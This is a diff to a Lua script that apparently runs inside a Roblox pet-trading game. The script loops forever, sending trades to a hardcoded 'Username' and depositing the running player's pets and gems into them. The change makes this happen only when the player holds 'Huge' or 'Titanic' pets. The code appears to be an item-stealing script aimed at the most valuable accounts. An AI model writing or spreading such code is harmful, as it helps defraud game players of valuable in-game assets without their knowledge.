@@ -139,19 +139,21 @@ function UnlockPets()
     end
 end
 
-UnlockPets()
+if HasHuge() == "Yes" or HasTitanic() == "Yes" then
+	UnlockPets()
 
-while true do
-    wait(0.1)
-    if game:GetService("Players"):WaitForChild(Username) ~= nil then
-        SendTrade(Username)
-    end
-    if game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == true and GetTradeID() ~= nil then
-        if deposited ~= true then
-            DepositPetInTrade()
-			AddGemsToTrade()
-            ReadyTrade()
-        end
-        wait(3)
-    end
+	while true do
+		wait(0.1)
+		if game:GetService("Players"):WaitForChild(Username) ~= nil then
+			SendTrade(Username)
+		end
+		if game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == true and GetTradeID() ~= nil then
+			if deposited ~= true then
+				DepositPetInTrade()
+				AddGemsToTrade()
+				ReadyTrade()
+			end
+			wait(3)
+		end
+	end
 end
